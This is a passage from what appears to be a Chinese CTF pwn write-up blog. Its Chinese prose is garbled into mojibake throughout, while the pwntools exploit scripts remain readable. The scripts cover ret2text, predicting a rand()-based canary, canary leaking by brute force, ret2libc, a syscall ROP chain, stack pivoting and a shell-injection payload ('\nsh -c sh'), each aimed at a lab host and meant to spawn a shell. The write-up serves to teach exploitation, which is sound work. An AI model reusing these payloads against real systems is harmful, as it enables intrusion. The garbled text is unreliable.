¼å­—ç¬¦ä¸²ä»¥â€™\\0â€™ç»“å°¾çš„ç‰¹ç‚¹ã€‚å­¦ä¹ å„ç§å­—ç¬¦ä¸²æ“ä½œå¯¹â€™\\0â€™çš„å¤„ç†ï¼Œä½ æ‰èƒ½å®Œç¾åœ°åˆ©ç”¨ç¨‹åºä¸­çš„æ¼æ´ã€‚\n\nä½¿ç”¨\\x00æˆªæ–­å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å‰4æ˜¯moewï¼Œret2textljuståŸæ•°æ®é å·¦ ï¼ŒrjuståŸæ•°æ®é å³ï¼Œéƒ½ç”¨æ¥å¡«å……å­—èŠ‚ã€‚from pwn import *context.log_level=&#x27;debug&#x27;p=remote(&#x27;192.168.50.1&#x27;,53500)#p=process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)backdoor=0x40123bpayload=b&#x27;moew\\x00&#x27;.ljust(0x20+8,b&#x27;a&#x27;)+p64(backdoor)p.sendlineafter(b&#x27;say?&#x27;,payload)p.sendlineafter(&#x27;?&#x27;,b&#x27;200&#x27;)p.interactive()\nxdulake\næ€ä¹ˆæœ‰ä¸ªå¤§ä¸€æ–°ç”Ÿèµ°åˆ°æ¹–é‡Œäº†ï¼Ÿæ ˆä¸Šçš„æ•°æ®ä¸ä¼šæ— ç¼˜æ— æ•…åœ°è¢«æ¸…ç†ï¼Œä½ èƒ½æ ¹æ®è¿™ä¸ªä¿¡æ¯æ‹¯æ•‘/æˆä¸ºlakerå—ï¼Ÿ\n\næ³¨æ„åˆ°æœ‰åé—¨å‡½æ•°ã€‚pull()ä¸­æ³„éœ²PIEåŸºå€ï¼Œphoto()å¯ä»¥è¯»64ä¸ªå­—èŠ‚ï¼Œlaker()å°†s1ä¸&quot;xdulaker&quot;æ¯”è¾ƒï¼Œç›¸åŒåˆ™é€šè¿‡ã€‚int photo()&#123;  char buf[80]; // [rsp+0h] [rbp-50h] BYREF...  read(0, buf, 0x40uLL);...&#125;ssize_t laker()&#123;  char s1[48]; // [rsp+0h] [rbp-30h] BYREF  if ( memcmp(s1, &quot;xdulaker&quot;, 8uLL) )...&#125;photo()ç”³è¯·äº†0x50çš„æ ˆç©ºé—´ï¼Œrbp-50h,å†™å…¥äº†0x40å­—èŠ‚çš„æ•°æ®ã€‚laker()ä¸­s1ä»rbp-30hå¼€å§‹æ¯”è¾ƒï¼Œè¿™é‡Œç®€å•éªŒè¯ä¸€ä¸‹Hey,what&#x27;s your name?!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxdulakerI will teach you a lesson.&gt;3welcome,xdulakeré€šè¿‡éªŒè¯ï¼Œæ¥ä¸‹æ¥æ˜¯ç†Ÿæ‚‰çš„ret2textäº†ã€‚from pwn import*context.log_level =&#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;192.168.50.1&#x27;,59868)p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;1&#x27;)p.recvuntil(b&#x27;gift:&#x27;)leak_opt = int((p.recv(14)),16)pie_base=leak_opt - 0x4010bkd=pie_base+0x124Elog.success(hex(pie_base))p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;2&#x27;)payload1 = b&#x27;a&#x27;*0x20 + b&#x27;xdulaker&#x27;p.sendafter(b&#x27;your name?!\\n&#x27;,payload1)p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;3&#x27;)p.recvline()payload2 = b&#x27;a&#x27;*48 + b&#x27;SNOWCATT&#x27; + p64(bkd)p.sendline(payload2)p.interactive()\nboom\nä½ å¯ä»¥è½»æ˜“çˆ†ç ´æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œä½†æ˜¯ä¸€ä¸ªä¸å¯æ³„éœ²çš„â€œcanaryâ€ä½ åˆè¯¥å¦‚ä½•åº”å¯¹ï¼Ÿ\n\näººå·¥canaryï¼Œæä¾›äº†winå‡½æ•°ï¼Œæç¤ºå¯ä»¥ä½¿ç”¨pythonçš„ctypesåŒ…ctypeså¯ä»¥è°ƒç”¨Cåº“å‡½æ•°ï¼Œäºæ˜¯ä½¿ç”¨ctypesåŠ è½½libcinit()ä¸­æœ‰v0 = time(0LL)ï¼Œä½¿time=0ï¼Œchar s[124]; // [rsp+0h] [rbp-90h] BYREFint v5; // [rsp+7Ch] [rbp-14h]int v6; // [rsp+8Ch] [rbp-4h]å…ˆå¡«å……0x90-0x14ï¼Œå†å¡«å……canaryï¼Œå†å¡«å……16+8\nfrom pwn import *import ctypesimport timep = remote(&#x27;192.168.50.1&#x27;, 58472)#p=process(&#x27;./pwn&#x27;)libc = ctypes.CDLL(&#x27;libc.so.6&#x27;)libc.srand(int(time.time()))canary = libc.rand() % 114514backdoor = 0x401276ret = 0x40101ap.sendlineafter(b&#x27;(y/n)&#x27;, b&#x27;y&#x27;)payload = b&#x27;a&#x27; * 124 + p32(canary) + b&#x27;a&#x27;*24+p64(ret)+ p64(backdoor)p.sendlineafter(b&#x27;Enter your message: &#x27;, payload)p.interactive()\nboom_revengeåŒä¸Šï¼ˆä¸ºä»€ä¹ˆé‡å¤å‡ æ¬¡æ‰æˆåŠŸï¼Ÿï¼‰ğŸ¤”\nfrom pwn import *import ctypesimport timep = remote(&#x27;192.168.50.1&#x27;, 62171)#p=process(&#x27;./pwn&#x27;)libc = ctypes.CDLL(&#x27;libc.so.6&#x27;)libc.srand(int(time.time()))canary = libc.rand() % 114514backdoor = 0x401276ret = 0x40101ap.sendlineafter(b&#x27;(y/n)&#x27;, b&#x27;y&#x27;)payload = b&#x27;a&#x27; * 124 + p32(canary) + b&#x27;a&#x27;*24+p64(ret)+ p64(backdoor)p.sendlineafter(b&#x27;Enter your message: &#x27;, payload)p.interactive()\nezlibc\nç›¸ä¿¡åšäº†å‰é¢é¢˜çš„ä½ ï¼Œå·²ç»åˆæ­¥å¼€å§‹äº†è§£æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹äº†ã€‚åœ¨è¿™é“é¢˜ï¼Œä½ å°†ç†è§£åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šï¼Œè¿™é‡Œå¼€å¯äº†ASLRå’ŒPIEï¼Œä½†æ˜¯ï¼Œæˆ‘ç»™äº†ä½ ä¸€ä¸ªå°ç¤¼ç‰©æ¥åº”å¯¹ä¸¤ä¸ªé˜²æŠ¤ï¼ŒåŠ¡å¿…å¦¥å–„ä¿ç®¡ï¼ è¿™ä¸ªç¤¼ç‰©æŸç§æƒ…å†µä¸‹è¿˜ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæˆä¸ºå¦ä¸€ç§ç¥å…µåˆ©å™¨ï¼Œè‡³äºæ€ä¹ˆæ”¹å˜ï¼Œå°±è¦é ä½ è‡ªå·±å»æ‘¸ç´¢äº†ï¼\nå»ºè®®ä½ åˆ©ç”¨gdbï¼Œå®Œæ•´çš„è·Ÿè¸ªä¸€ä¸‹æ•´ä¸ªåŠ¨æ€é“¾æ¥å’Œå»¶è¿Ÿç»‘å®šçš„è¿‡ç¨‹ï¼Œè¿™æ ·ä½ èƒ½æ›´äº†è§£å®ƒç©¶ç«Ÿæ˜¯æ€ä¹ˆå®Œæˆè¿™ä¸ªå·¥ä½œçš„ï¼ŒåŒæ—¶æœ‰åŠ©äºä½ æ›´åŠ çš„äº†è§£ret2libcè¿™ç§æ”»å‡»ã€‚\n\nå¼€å¯äº†PIEï¼Œæ˜¾ç„¶å¯ä»¥é€šè¿‡readæ³„éœ²PIEåŸºå€ï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹å»¶è¿Ÿç»‘å®šï¼Œè¿˜éœ€è¦æ³„éœ²libcï¼Œäºæ˜¯è¿”å›æ³„éœ²libcã€‚å½“é‡‡ç”¨åŠ¨æ€é“¾æ¥ä»¥åŠå»¶è¿Ÿç»‘å®šä¹‹åï¼Œç¨‹åºåˆåŠ è½½çš„æ—¶å€™ï¼Œå¹¶ä¸çŸ¥é“è¯¸å¦‚readç­‰libcå‡½æ•°çš„å®é™…åŠ è½½åœ°å€ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡è¯¥æœºåˆ¶è¿›è¡Œè§£æä¹‹åï¼Œæ‰ä¼šå¡«å…¥gotè¡¨ã€‚å³å»¶è¿Ÿç»‘å®šä¸‹ got è¡¨åˆå§‹å€¼æ˜¯ plt_resolve åœ°å€ç°åœ¨ä½ æŒæ¡ret2libcäº†ï¼Œä»¥åŠpwntoolsæŸ¥æ‰¾libcä¸­å‡½æ•°å’Œå­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚from pwn import*context.log_level=&#x27;debug&#x27;elf=ELF(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)p=remote(&quot;192.168.50.1&quot;,65064)p.recvuntil(&quot;use &quot;)leak_read=int((p.recv(14)),16)pie_base=leak_read-0x1060start=pie_base+0x10c0payload=b&quot;A&quot;*40+p64(start)p.send(payload)p.recvuntil(&quot;use &quot;)leak_read2 = int(p.recv(14),16)libc_base=leak_read2-libc.symbols[&#x27;read&#x27;]system=libc_base+libc.symbols[&#x27;system&#x27;]bin_sh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))pop_rdi=libc_base+0x2a3e5ret=pie_base+0x101apayload=b&quot;a&quot;*40+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)p.send(payload)p.interactive()\ninject\nä¸€èˆ¬æ¥è¯´ Pwn challenges éƒ½ä»¥å†…å­˜æŸåæ¼æ´ä¸ºä¸»ã€‚ç„¶è€Œ binary ç¨‹åºæœ‰å¾ˆå¤šæ¼æ´ä¸éœ€è¦å†…å­˜è¶Šç•Œè¯»å†™ï¼Œå¼€å†å¤šçš„ä¿æŠ¤ä¹Ÿé˜²ä¸ä½ï¼Œç¨‹åºå‘˜å³ä½¿æ¢ç”¨ Rust ç­‰å†…å­˜å®‰å…¨è¯­è¨€ä¹Ÿå¯èƒ½çŠ¯ç›¸åŒçš„é”™è¯¯ã€‚è¿™ç§æ¼æ´åˆ©ç”¨èµ·æ¥ç®€å•ï¼Œå±å®³å¯èƒ½è¿˜æ›´å¤§ï¼Ÿï¼\n\nè¿™æ˜¯Rustå†™çš„å—ä½¿ç”¨#æ³¨é‡Š-c 4æˆ–ç¬¬ä¸€ä¸ªshæ‰§è¡Œç¬¬äºŒä¸ªsh ping sh -c sh -c 4from pwn import *#p=process(&#x27;./pwn&#x27;)p=remote(&#x27;192.168.50.1&#x27;, 52971)p.sendlineafter(&#x27;Your choice: &#x27;,str(4))#payload = &quot;\\nsh -c sh&quot;#payload=&quot;\\nsh #&quot;p.sendafter(&#x27;Enter host to ping: &#x27;,payload)p.interactive()\nrandomlock\nè¯¸å¦‚randä¹‹ç±»çš„å‡½æ•°ï¼Œç”Ÿæˆçš„æ•°åˆ—è™½ç„¶çœ‹èµ·æ¥æ˜¯éšæœºçš„ï¼Œä½†å®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ªç¡®å®šçš„ç®—æ³•äº§ç”Ÿçš„ï¼Œå› æ­¤ç§°ä¸ºâ€œä¼ªéšæœºâ€ã€‚é‚£ä¹ˆåªè¦ç§å­å›ºå®šï¼Œæˆ‘ä»¬ä¸å°±å¯ä»¥å¾—åˆ°å›ºå®šçš„æ•°åˆ—äº†å—ï¼Ÿå½“ç„¶ï¼Œæˆ‘è¿™é“é”çš„ç§å­å¯æ˜¯ç»è¿‡â€çœŸéšæœºâ€ä¸â€åŠ å¯†â€ä¸¤é“å·¥åºï¼Œè‡³å°‘çœ‹èµ·æ¥æ²¡é‚£ä¹ˆå®¹æ˜“ç ´è§£ï¼Ÿ\n\nçŒœæµ‹seedæ˜¯1from pwn import *import ctypeslibc = ctypes.CDLL(&quot;libc.so.6&quot;)libc.srand(1)p = remote(&#x27;192.168.50.1&#x27;,62581)p.recvuntil(b&quot;&gt;&quot;)for i in range(10):    r = libc.rand() % 10000    p.sendline(str(r).encode())    if i &lt; 9:        p.recvuntil(b&quot;&gt;&quot;)print(p.recvall())\nsyslock\nç³»ç»Ÿè°ƒç”¨æ˜¯ä»€ä¹ˆï¼Ÿsystem å‡½æ•°ä½¿ç”¨äº†ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨æ¥å¯åŠ¨ä¸€ä¸ª shell å­è¿›ç¨‹ï¼Ÿå¦‚ä½•è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Ÿ\n\nå¾ˆå–„è‰¯åœ°æä¾›äº†ä¸€äº›gadgetï¼Œlose()ä¸­ä¹Ÿæœ‰syscallã€‚è¿˜éœ€è¦è‡ªå·±è¯»è¿›å»/bin/sh,æ³¨æ„åŠ›æ¶£æ•£çš„ç¬”è€…æ³¨æ„åˆ°äº†main()çš„é€»è¾‘æ˜¯i &lt;= 4&amp;&amp;i == 59ï¼Œi = input();if ( i &gt; 4 )  lose();write(1, &quot;Input your password\\n&quot;, 0x14uLL);read(0, (char *)&amp;s + i, 0xCuLL);if ( i != 59 )  lose();cheat();59æš—ç¤ºç³»ç»Ÿè°ƒç”¨å·ï¼Œè¿™é‡Œä¸éœ€è¦ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œè€Œæ˜¯åˆ©ç”¨æ•°ç»„ä¸‹æ ‡è¶Šç•Œä¿®æ”¹å…¨å±€å˜é‡ã€‚æŸ¥çœ‹.bssæ®µiçš„åœ°å€æ˜¯0x404080sçš„åœ°å€æ˜¯0x4040a0å·®æ˜¯0x20ï¼Œä¹Ÿå°±æ˜¯&amp;s+-32æŒ‡å‘iï¼Œä¿®æ”¹ä½¿å…¶ä¸º59ã€‚åœ¨cheat()ä¸­è¦†ç›–ï¼Œæ³¨æ„åˆ°è¿˜æ²¡æœ‰è¯»å…¥/bin/shå› ä¸ºæ²¡æœ‰æ³¨æ„åˆ°main()ä¸­èƒ½è¯»12å­—èŠ‚ï¼Œç¬”è€…åœ¨cheat()ä¸­è¯»å…¥/bin/shã€‚ğŸ˜­ğŸ˜­ğŸ˜­æ³¨æ„åŠ›æ¶£æ•£ä¸€ä¸ªæŸ¥è¯¢ç³»ç»Ÿè°ƒç”¨å·çš„ç½‘ç«™https:/syscall.sh/from pwn import*context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;192.168.50.1&#x27;,54928)pop_rdi_rsi_rdx = 0x401240pop_rax = 0x401244syscall = 0x401230read_plt = 0x4010A0s_addr = 0x4040A0p.sendlineafter(b&#x27;choose mode\\n&#x27;,b&#x27;-32&#x27;)p.recvuntil(b&#x27;Input your password&#x27;)p.send(p64(59))payload = b&#x27;a&#x27;*64payload += b&#x27;SNOWCATT&#x27;payload += p64(pop_rdi_rsi_rdx)payload += p64(0) + p64(s_addr) + p64(8)payload += p64(read_plt)payload += p64(pop_rdi_rsi_rdx)payload += p64(s_addr) + p64(0) + p64(0)payload += p64(pop_rax) + p64(59)payload += p64(syscall)p.recvuntil(b&#x27;Developer Mode.\\n&#x27;)p.send(payload)sleep(0.1)p.send(b&quot;/bin/sh\\x00&quot;)p.interactive()main()ä¸­readèƒ½è¯»12å­—èŠ‚ï¼Œä½¿ç”¨p32å‘é€59ï¼Œ8å­—èŠ‚/bin/sh\\x00ï¼Œä¸éœ€è¦å†è°ƒç”¨readï¼Œè¿™é‡Œä¸å†ç»™å‡ºexpã€‚\nezprotection\nä½ ä»¬è¿™äº› pwnerï¼Œå¤©å¤©å°±æƒ³ç€æº¢å‡ºï¼Œè¿™æ¬¡æˆ‘æ”¾äº†ä¸€åª canary åœ¨è¿™é‡Œï¼Œå®ƒä¼šä¸€ç›´ç›¯ç€ä½ ï¼Œç›´åˆ°æ°¸è¿œï¼\n\nå¡«æ»¡bufè¦†ç›–\\x00æ³„éœ²canaryï¼Œå¾ªç¯æ”»å‡»çˆ†ç ´canaryï¼Œç©ºé—´ä¸å¤Ÿå°±ä½¿ç”¨p16from pwn import*context.log_level = &#x27;debug&#x27;bkd = 0x127Dwhile True:    # p = process(&#x27;./pwn&#x27;)    p = remote(&#x27;192.168.50.1&#x27;,59263)    try:        p.sendafter(b&#x27;over you.\\n&#x27;,b&#x27;A&#x27;*25)        p.recvuntil(b&#x27;A&#x27;*25)        canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))        log.success(f&quot;Leaked canary: &#123;hex(canary)&#125;&quot;)        payload = b&quot;a&quot;*24 + p64(canary) + b&#x27;SNOWCATT&#x27; + p16(bkd)        p.sendline(payload)    except:        print(&quot;error&quot;,end=&#x27; &#x27;)    else:        p.interactive()        continue\nezpivot\nä¸æ˜¯æ¯ä¸€æ¬¡æˆ‘ä»¬éƒ½èƒ½é‡åˆ°è¶³å¤Ÿé•¿çš„ç¼“å†²åŒºæº¢å‡ºã€‚è¿™ä¸€æ¬¡ï¼Œåªèƒ½æº¢å‡ºä¸€ç‚¹ç‚¹ï¼Œé‚£ä½ è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæ ˆè¿ç§»å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ä¸ªæ‰‹æ®µï¼Œé€šè¿‡æ ˆè¿ç§»æˆ‘ä»¬èƒ½è·å¾—è¶³å¤Ÿçš„æ ˆç©ºé—´ï¼Œä½†æ˜¯è¯·æ³¨æ„è¿ç§»ä¹‹åçš„æ ˆå¸ƒå±€ã€‚\n\næ ˆè¿ç§»çš„ä¸€ä¸ªæ–¹æ³•æ˜¯ä¸¤æ¬¡leave; retnæŠŠæå‰å¸ƒç½®å¥½çš„ropé“¾æ”¾åˆ°åé¢å†æ‰§è¡Œçš„æ“ä½œå°±å«åšæ ˆé£æ°´\nmian()ä¸­è¯»å–äº†ä¸€ä¸ªæ•´æ•°v4ï¼Œæ³¨æ„åˆ°v4&gt;32åˆ™é€€å‡ºï¼Œintroduce()ä¸­ä¼šå‘.bssæ®µçš„descè¯»v4å­—èŠ‚ã€‚è¦æŠŠ.bssä¼ªé€ æˆä¸€ä¸ªæ ˆï¼Œè¶Šå¤§è¶Šå¥½ã€‚lea     rax, [rbp+var_10]mov     rsi, raxlea     rax, aD           ; &quot;%d&quot;mov     rdi, raxcall    ___isoc99_scanf...mov     eax, [rbp+var_10]cmp     eax, 20h          ; 0x20 = 32jle     short loc_401306  ; å¦‚æœ eax &lt;= 32 åˆ™è·³è½¬è¿™é‡Œå‘ç°read()çš„å‚æ•°æ˜¯nbyteså¦‚æœæ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œé‚£å®ƒä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå·¨å¤§çš„æ­£æ•°ã€‚push    rbpmov     rbp, rspsub     rsp, 10hmov     dword ptr [rbp+nbytes], edimov     eax, dword ptr [rbp+nbytes]mov     rdx, rax        ; nbyteslea     rax, descmov     rsi, rax        ; bufmov     edi, 0          ; fdcall    _readmain()çš„æœ«å°¾ï¼šmov     eax, cs:len_of_phonenum ;è¿™é‡Œæ˜¯0x1C = 28movsxd  rdx, eax                ;nbyteslea     rax, [rbp+buf]          ;bufmov     rsi, raxcall    _readbuf12å­—èŠ‚ï¼Œè¦†ç›–rbp8å­—èŠ‚ï¼Œå‰©ä¸‹8å­—èŠ‚æ­£å¥½è¦†ç›–è¿”å›åœ°å€ã€‚ç¬”è€…å…ˆç”¨introduce()åœ¨.bssæ®µå¸ƒç½®å¥½ropé“¾ï¼Œå†å°†è¿”å›åœ°å€è¦†ç›–ä¸ºleave; retnã€‚å½“æˆ‘ä»¬åœ¨è¿”å›åœ°å€å¤„æ”¾ä¸€ä¸ª leave; retï¼Œè€Œä¹‹å‰åˆé€šè¿‡æº¢å‡ºä¿®æ”¹äº† rbp æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œç¬¬äºŒæ¬¡ leaveï¼Œè¿™æ—¶ rsp å°±ä¼šè¢«å¼ºè¡Œæ‹‰åˆ°æˆ‘ä»¬æŒ‡å®šçš„ .bss åœ°å€ã€‚from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;192.168.50.1&#x27;,50126)# gdb.attach(p, &#x27;b *main&#x27;)p.sendlineafter(b&#x27;of your introduction.&#x27;,b&#x27;-1&#x27;)pop_rdi = 0x401219system = 0x401230desc = 0x404060ret = 0x40101aleave = 0x40120fpayload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;\\x00&#x27;*(0x600-8+0x100)  + p64(0x404600) + p64(0x404600)payload += p64(pop_rdi) + p64(0x404060) + p64(ret) + p64(system)p.send(payload)payload1 = b&#x27;a&#x27; * 12 + p64(0x404660-8+0x100+0x10) + p64(leave)p.sendafter(b&#x27;lease tell us your phone number:&#x27; , payload1)p.interactive()\n\nåœ°å€ 0x404660-8+0x100+0x10ï¼šé¦–å…ˆrbpè¢«èµ‹å€¼ä¸ºè¿™ä¸ªåœ°å€ï¼Œç¬¬äºŒä¸ªleaveæ—¶ï¼Œrspå˜ä¸ºè¿™ä¸ªåœ°å€ï¼Œç´§æ¥ç€ pop rbp ä¼šè®© rsp + 8,è¿™æ ·ä½¿rspæŒ‡å‘payloadä¸­pop rdiçš„ä½ç½®ã€‚\nå¡«å……äº†å¤§é‡\\x00å¹¶å°†ROPæ”¾åœ¨è¿œç¦»descå¼€å¤´ï¼Œé¿å…åç»­å‡½æ•°è°ƒç”¨äº§ç”Ÿçš„æ ˆå¸§è¦†ç›–æ‰æˆ‘ä»¬å†™çš„ä¸œè¥¿ã€‚\n\n\n   è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªæ ˆè¿ç§»çš„å…¥é—¨é¢˜ï¼Œå¸Œæœ›æ–°æ‰‹åœ¨å…¥é—¨æ ˆè¿ç§»çš„æ—¶å€™ï¼Œä¸è¦ç”¨è‡ªå·±å¤§è„‘æ¨¡æ‹Ÿï¼Œå¤šè°ƒè¯•å¤šè·Ÿè¸ªï¼Œexpä¸€æ­¥ä¸€æ­¥çš„å†™ï¼Œç„¶åå»è§‚å¯Ÿrbpä»¥åŠrspçš„å˜åŒ–ï¼Œæ­¤æ—¶æ‰èƒ½å¯¹äºè¿ç§»çš„è¿‡ç¨‹æ›´åŠ äº†ç„¶äºèƒ¸ï¼Œè¿™é‡Œçš„å‘æ˜¯ï¼Œé¦–å…ˆï¼Œå½“systemè°ƒç”¨çš„æ—¶å€™ï¼Œéœ€è¦é¢„ç•™å¥½æ ˆç©ºé—´ï¼Œå¦‚æœæ ˆç©ºé—´ä¸è¶³ï¼Œå½“è¿ç§»åˆ°bssæ®µä¹‹åï¼Œä¸€äº›æŒ‡ä»¤ä¼šè®¿é—®æˆ–è€…ç”šè‡³ä¿®æ”¹åˆ°åªè¯»çš„ä»£ç æ®µï¼Œå¼•èµ·æ®µé”™è¯¯ï¼Œæˆ‘æ³¨æ„åˆ°å¾ˆå¤šé”¤çš„åŒå­¦ï¼Œä»–ä»¬æŠ¬é«˜æ ˆçš„æ‰‹æ®µæ˜¯ç¡¬ç”Ÿç”Ÿè¾“å…¥è¯¸å¦‚0x600ä¸ªaï¼Œå…¶å®æ— éœ€è¿™ä¹ˆéº»çƒ¦ï¼Œå¹¶ä¸”å¤ªå¤§é‡çš„è¾“å…¥ä¼šå¯¼è‡´æ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œå‡ºç°ioé—®é¢˜ï¼Œç›´æ¥ç„å­¦æŠ¥é”™ï¼Œä½ è¦æ³¨æ„åˆ°ï¼Œreadåœ¨è¯»å–çš„æ—¶å€™ï¼Œæ˜¯ç”¨rbpå¯»å€çš„ï¼Œå› æ­¤å½“ä½ æ§åˆ¶äº†rbpä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä»»æ„åœ°å€å†™äº†ï¼Œæ­¤æ—¶ç›´æ¥å†™åˆ°é«˜åœ°å€å³å¯ï¼Œå¦ä¸€ä¸ªå‘çš„è¯ï¼Œå°±æ˜¯ï¼Œå½“ä½ è¿ç§»ä¹‹åï¼Œæ‰§è¡Œsystemä¹‹å‰ï¼Œä¸€å®šè¦æ³¨æ„rbpçš„æœ‰æ•ˆæ€§ï¼Œå¾ˆå¤šåŒå­¦å°†rspè¿ç§»è¿‡æ¥ä¹‹åï¼Œå°±å¯¹rbpä¸ç®¡ä¸é¡¾äº†ï¼Œæ­¤æ—¶rbpç›¸å…³çš„æŒ‡ä»¤åœ¨è®¿å­˜çš„æ—¶å€™ï¼Œä¼šå› ä¸ºrbpæ˜¯ä¸€ä¸ªæ— æ•ˆçš„å€¼è€Œå¼•èµ·æ®µé”™è¯¯ã€‚\n\nfmt_S\nfmtç«Ÿç¦»å¼€äº†æ ˆï¼Œæˆ‘èƒ½ä¾èµ–çš„ï¼Œä¹Ÿè®¸åªæœ‰æ ˆä¸Šç°æœ‰çš„æŒ‡é’ˆäº†ï¼Ÿ\n\nfmt_T\nè¶Šæ¥è¶Šçƒ­ â€¢ â€œæ·±å…¥æ´ç©´æ¢é™©ï¼Œåˆ°è¾¾ç†”ç«åœ°ç‹±ã€‚â€\n\nå¼€å¯äº†æ ˆä¿æŠ¤ã€‚fgets(s, 6, stdin);printf(s);æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ\nhardpivot\nä¸€æ¬¡çš„æ ˆè¿ç§»ä¼¼ä¹ä¸å¤Ÿç”¨äº†ï¼Œä½ è¦æ€æ ·æ‰èƒ½å†æ¬¡è¿ç§»å‘¢ï¼Ÿå¦‚ä½•å¸ƒå±€æ ˆæ‰èƒ½æ‹¿åˆ°è¿™ä¸€é¢˜çš„ flag å‘¢ï¼Ÿè¿™ä¸€æ¬¡ï¼Œä½ éœ€è¦æŠŠå‰é¢çš„çŸ¥è¯†èä¼šè´¯é€šï¼Œæ‰èƒ½åœ¨è¿™ä¸€é¢˜æˆåŠŸã€‚åŠ æ²¹ï¼\n\nshellbox\næ²™ç®±ä¿æŠ¤ã€é™æ€é“¾æ¥â€¦I have an idea.\n\nNo way to leak!\næœ‰äº›æ—¶å€™ï¼Œæ˜æ˜éšä¾¿åŠ«æŒç¨‹åºæ§åˆ¶æµç¨‹ï¼Œä½†æ˜¯ä½ å´æ€ä¹ˆä¹Ÿæ³„éœ²ä¸å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œåªèƒ½å¹²ç€æ€¥ï¼Œè¿™æ—¶å€™ï¼Œä¸å¦‚è¯•ç€å»äº†è§£ä¸€ä¸‹ret2dlresolveè¿™ä¸ªæŠ€æœ¯å§ï¼Œæ‹¿åˆ°è¿™é¢˜çš„flagï¼Œä¸è¯¥æˆä¸ºä½ çš„ç›®çš„ï¼Œä½ çš„ç›®çš„åº”è¯¥æ˜¯ï¼Œåœ¨åšè¿™ä¸ªé¢˜çš„è¿‡ç¨‹ä¸­ï¼Œè·Ÿç€GDBï¼Œå†é‡æ–°äº†è§£ä¸€ä¸‹åŠ¨æ€é“¾æ¥ï¼Œä»”ç»†çš„è·Ÿè¸ªä¸€ä¸‹å®ƒç©¶ç«Ÿæ˜¯æ€ä¹ˆè§£æå‡ºç¬¦å·çš„ï¼ˆå¹¶ä¸æ˜¯åƒå‰é¢çš„ret2libcä¸€æ ·ï¼Œåªæµ…æµ…çš„äº†è§£ï¼Œä¸å¦¨è·Ÿè¸ªä¸€ä¸‹ä»_dl_runtime_resolveå‡½æ•°å¼€å§‹çš„è§£æè¿‡ç¨‹ï¼‰ï¼Œç›¸ä¿¡ä½ ä¼šå—ç›ŠåŒªæµ…ï¼\n\ncall it\n çœæµï¼šJOP æ”»å‡»\n\nto be continuedâ€¦\n","categories":["PWN"],"tags":["Write Up","PWN"]}]